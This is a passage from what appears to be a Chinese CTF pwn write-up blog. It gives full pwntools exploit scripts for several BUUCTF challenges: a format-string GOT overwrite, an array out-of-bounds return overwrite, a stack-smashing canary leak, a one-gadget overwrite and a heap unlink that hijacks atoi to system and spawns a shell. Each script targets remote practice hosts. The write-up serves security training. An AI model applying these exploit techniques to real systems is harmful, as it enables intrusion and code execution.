data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------------------------------</span><br>offset=<span class="hljs-number">7</span><br>strcmp_got=elf.got[<span class="hljs-string">&#x27;strcmp&#x27;</span>]<br>system=elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload=fmtstr_payload(offset,&#123;strcmp_got:system&#125;)<br>sl(payload)<br>sl(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="wustctf2020-name-your-cat">wustctf2020_name_your_cat</h3><p>数组越界</p><p>可以直接跳至ret</p><p>说一下为什么要循环四次:</p><p>我们改的是vulnerable的ret，他要ret的话，要结束5个循环，所以先填4个循环</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./wustctf2020_name_your_cat&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29315</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------------------------------</span><br>backdoor=<span class="hljs-number">0x80485cb</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(i))<br>        sla(<span class="hljs-string">&#x27;Give your name plz: &#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Give your name plz: &#x27;</span>,p32(backdoor))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="wdb2018-guess">wdb2018_guess</h3><p><strong>stack smashing–canary报错利用</strong>,本题因为有fork，有三条命，不然正常来讲报错就结束进程了</p><p>参考师傅：[<a href="https://blog.csdn.net/mcmuyanga/article/details/114789897?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=wdb2018_guess&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-114789897.nonecase&amp;spm=1018.2226.3001.4187">BUUCTF]PWN——wdb2018_guess（stack smashing–canary报错利用）_mcmuyanga的博客-CSDN博客</a></p><p>先vim ./wdb2018_guess 输入/alarm，把它改为isnan</p><p>方便我们本地运行</p><p>fork()创建子进程</p><p>wait()会暂时停止目前进程的执行, 直到有信号来到或子进程结束.</p><p><strong>具体步骤：</strong></p><p><strong>1.第一条命，泄露puts_got</strong></p><p>gdb调试得到 我们输入与__libc_argv[0] 的偏移</p><p>__libc_argv[0] 里存的就是./GUESS，报错时</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-strong">**<span class="hljs-emphasis">*stack smashing detected*</span>**</span>: ./GUESS terminated<br></code></pre></td></tr></table></figure><p>就会打印处程序名字，把它覆盖成got表，就能打印got表了</p><p>0xdf38-0xde10=0x128</p><p><strong>2.第二条命，泄露_environ（环境变量）,也是栈地址</strong></p><p>gdb调试算出flag与environ的偏移</p><p>用命令</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf">x/a <span class="hljs-variable">_environ</span><br>search <span class="hljs-built_in">flag</span><br></code></pre></td></tr></table></figure><p>通过_environ的地址得到_environ的值，从而得到环境变量地址，环境变量保存在栈中，所以通过栈内的偏移量，可以访问栈中任意变量</p><p>0xd8a8-0xd740=0x168</p><p><strong>3.第三条命，泄露flag</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./GUESS&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26170</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------------------------------</span><br>sla(<span class="hljs-string">&#x27;Please type your guessing flag\n&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x128</span>+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>puts_addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br>obj = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts_addr)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts_addr)<br>libc_base=puts_addr-obj.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br>environ=libc_base+libc.sym[<span class="hljs-string">&#x27;__environ&#x27;</span>]<br><span class="hljs-comment">#----------------------------------------------</span><br>sla(<span class="hljs-string">&#x27;Please type your guessing flag\n&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x128</span>+p64(environ))<br>ru(<span class="hljs-string">&#x27;stack smashing detected ***: &#x27;</span>)<br>stack=uu64(rc(<span class="hljs-number">6</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(stack)<br><span class="hljs-comment">#---------------------------------------------</span><br>sla(<span class="hljs-string">&#x27;Please type your guessing flag\n&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x128</span>+p64(stack-<span class="hljs-number">0x168</span>))<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="oneshot-tjctf-2016">oneshot_tjctf_2016</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#r=process(&#x27;./oneshot_tjctf_2016&#x27;)</span><br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25296</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./oneshot_tjctf_2016&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>r.recvuntil(<span class="hljs-string">&#x27;Value: 0x0000&#x27;</span>)<br>puts_addr=<span class="hljs-built_in">int</span>(r.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>libc_base=puts_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br>og=libc_base+<span class="hljs-number">0x45216</span><br>r.sendline(<span class="hljs-built_in">str</span>(og))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="zctf2016-note2">zctf2016_note2</h3><p>参考师傅：<a href="https://blog.csdn.net/seaaseesa/article/details/105588640">(1条消息) zctf2016_note2_seaaseesa的博客-CSDN博客</a></p><p>堆溢出》unlink》泄露got》劫持got》开shell</p><p>这题漏洞在一个输入函数里，判断语句有个size-1，而且这个是无符号整数，我们申请size大小为0，0-1后，就会强转成一个极大值，造成任意大小的堆溢出</p><p>再加之本题有指针数组，采用unlink的做法，泄露atoi的got表最方便</p><p>这题ida要仔细看，输入处理有strncat，strcpy这些函数，遇到\x0截断，所以伪造chunk时要分步，先把后面的size改掉，再处理前面填充字符，用循环，能处理填充字符变为\x0是因为有   v1[size - strlen(&amp;dest) + 14] = 0   这个语句（我猜的，不然不也是接受到\x0就截断，咋处理）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./note2&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28331</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#---------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>        sla(<span class="hljs-string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Input the length of the note content:(less than 128)\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>        sla(<span class="hljs-string">&#x27;Input the note content:\n&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Input the id of the note:\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,choice,content</span>):<br>        sla(<span class="hljs-string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Input the id of the note:\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>        sla(<span class="hljs-string">&#x27;do you want to overwrite or append?[1.overwrite/2.append]\n&#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br>        <span class="hljs-keyword">if</span> choice==<span class="hljs-number">1</span>:<br>                sla(<span class="hljs-string">&#x27;TheNewContents:&#x27;</span>,content)<br>        <span class="hljs-keyword">elif</span> choice==<span class="hljs-number">0</span>:<br>                sla(<span class="hljs-string">&#x27;TheNewContents:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Input the id of the note:\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#---------------------------------------------------------</span><br>sla(<span class="hljs-string">&#x27;Input your name:\n&#x27;</span>,<span class="hljs-string">&#x27;qyq&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Input your address:\n&#x27;</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>target=<span class="hljs-number">0x602120</span><br>fd=target-<span class="hljs-number">0x18</span><br>bk=target-<span class="hljs-number">0x10</span><br>add(<span class="hljs-number">0x80</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xa1</span>)+p64(fd)+p64(bk))<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x0</span>,<span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<span class="hljs-comment">#2</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p8(<span class="hljs-number">0x90</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        edit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">&#x27;a&#x27;</span>*i)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p8(<span class="hljs-number">0xa0</span>))<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]))<br>show(<span class="hljs-number">0</span>)<br>atoi_addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br>libc_base=atoi_addr-libc.sym[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,p64(system))<br>sla(<span class="hljs-string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br><br><br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-final-2">ciscn_2019_final_2</h3><p>太难啦</p><p>seccomp-tools dump ./ciscn_final_2</p><p>沙盒，好像全关了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  =<span class="hljs-string">&#x27;./ciscn_final_2&#x27;</span><br>local_libc  = <span 